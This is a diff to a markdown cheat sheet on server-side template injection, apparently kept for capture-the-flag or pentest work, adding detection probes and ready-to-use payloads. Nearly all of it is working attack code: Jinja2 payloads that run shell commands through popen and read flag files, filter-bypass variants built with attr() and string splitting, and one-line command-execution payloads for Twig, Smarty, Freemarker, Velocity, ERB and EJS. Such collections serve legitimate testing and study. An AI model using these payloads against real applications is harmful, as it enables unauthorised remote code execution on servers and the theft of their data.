@@ -1,5 +1,15 @@
 # SSTI
 
+## Fast Tests
+
+```text
+{{7*7}}
+${7*7}
+<%= 7*7 %>
+#{7*7}
+*{7*7}
+```
+
 ## Payloads
 
 ```django
@@ -23,6 +33,36 @@ data = {"name": "#set($s='')#set($base=$s.__class__.__mro__[1])#foreach($sub in 
 data = {"name": "#set($x='')\n#set($cycler=$x.__class__.__mro__[1].__subclasses__()[479])\n#set($init=$cycler.__init__)\n#set($globals=$init.__globals__)\n#set($os=$globals.os)\n#set($popen=$os.popen('/readflag'))\n$popen.read()"}
 ```
 
+## Jinja2
+
+```django
+{{config}}
+{{self.__dict__}}
+{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
+{{''.__class__.__mro__[1].__subclasses__()}}
+{{''.__class__.__mro__[1].__subclasses__()[502]('cat /flag.txt',shell=True,stdout=-1).communicate()[0]}}
+{{lipsum.__globals__['os'].popen('cat /flag.txt').read()}}
+```
+
+## Filter Bypass
+
+```django
+{{request|attr('application')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__import__')('os')|attr('popen')('id')|attr('read')()}}
+{{lipsum.__getattribute__('__gl'+'obals__')['os'].popen('id').read()}}
+{{()|attr('__class__')|attr('__base__')|attr('__subclasses__')()}}
+```
+
+## Other Engines
+
+```text
+Twig: {{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}
+Smarty: {system('id')}
+Freemarker: <#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }
+Velocity: #set($s='')#set($x=$s.class.forName('java.lang.Runtime').getRuntime().exec('id'))
+ERB: <%= `id` %>
+EJS: <%= global.process.mainModule.require('child_process').execSync('id') %>
+```
+
 Read Code From Blackbox
 
 ```
@@ -34,4 +74,3 @@ Read Code From Blackbox
 * [https://hacktricks.boitatech.com.br/pentesting-web/ssti-server-side-template-injection](https://hacktricks.boitatech.com.br/pentesting-web/ssti-server-side-template-injection)
 * [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
 * [https://def.camp/wp-content/uploads/dc2023/Remi%20Gascou.pdf](https://def.camp/wp-content/uploads/dc2023/Remi%20Gascou.pdf)
-
